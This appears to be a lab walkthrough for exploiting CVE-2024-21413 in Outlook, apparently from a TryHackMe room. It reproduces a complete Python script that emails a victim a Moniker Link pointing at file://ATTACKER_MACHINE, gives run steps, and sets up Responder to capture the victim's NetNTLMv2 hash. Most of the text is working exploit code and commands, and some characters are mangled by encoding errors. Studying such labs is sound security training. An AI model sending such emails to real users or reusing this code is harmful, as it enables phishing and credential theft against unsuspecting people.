Goal: Send the victim an email containing a Moniker Link that bypasses Outlook â€œProtected View.â€ When the victim clicks it, their Outlook client attempts to load a file from your machine, leaking their NetNTLMv2 hash. ğŸ”¥

---

## PoC Summary

The script:

- Uses a sender + victim email.
    
- Authenticates via SMTP (password for _[attacker@monikerlink.thm](mailto:attacker@monikerlink.thm)_ is **attacker**).
    
- Sends an HTML email containing a Moniker Link:  
    `file://ATTACKER_MACHINE/test!exploit`
    
- Outlook loads the link â†’ forces an SMB connection â†’ hash leak to your Responder instance.
    

---

## PoC Code (unchanged)

```python
'''
Author: CMNatic | https://github.com/cmnatic
Version: 1.0 | 19/02/2024
'''

import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.utils import formataddr

sender_email = 'attacker@monikerlink.thm'
receiver_email = 'victim@monikerlink.thm'
password = input("Enter your attacker email password: ")
html_content = """\
<!DOCTYPE html>
<html lang="en">
    <p><a href="file://ATTACKER_MACHINE/test!exploit">Click me</a></p>
</html>"""

message = MIMEMultipart()
message['Subject'] = "CVE-2024-21413"
message["From"] = formataddr(('CMNatic', sender_email))
message["To"] = receiver_email

msgHtml = MIMEText(html_content, 'html')
message.attach(msgHtml)

server = smtplib.SMTP('MAILSERVER', 25)
server.ehlo()

try:
    server.login(sender_email, password)
except Exception as err:
    print(err)
    exit(-1)

try:
    server.sendmail(sender_email, [receiver_email], message.as_string())
    print("\n Email delivered")
except Exception as error:
    print(error)
finally:
    server.quit()
```

---

## Required Edits Before Running ğŸ› ï¸

1. Replace `ATTACKER_MACHINE` with your AttackBox IP.
    
2. Replace `MAILSERVER` with `10.65.153.222`.
    
3. Save as `exploit.py`.
    
4. Run:
    
    ```
    python3 exploit.py
    ```
    
    Enter password: **attacker**
    

If successful â†’ script prints **Email delivered**.

---

## Setting Up Responder ğŸ§²

Start SMB listener:

```
responder -I ens5
```

(Interface differs if you're not on AttackBox.)

Responder waits for incoming SMB authentication attempts.

---

## Victim Interaction ğŸ§‘â€ğŸ’»â¡ï¸ğŸ“¨

On the vulnerable VM:

1. Open Outlook.
    
2. Skip sign-in prompts.
    
3. Victim mailbox is preconfigured.
    
4. Open the received email titled **CVE-2024-21413**.
    
5. Click **Click me**.  
    âœ” Outlook fetches the file via SMB.  
    âœ” Client â€œauthenticatesâ€ to your machine.
    

---

## Hash Capture ğŸ¯

Back on the AttackBox: Responder logs the victimâ€™s **NetNTLMv2** hash.

Example output:

```
[SMB] NTLMv2-SSP Hash captured...
```

Hash obtained â†’ exploitation succeeded. ğŸ’€ğŸ”¥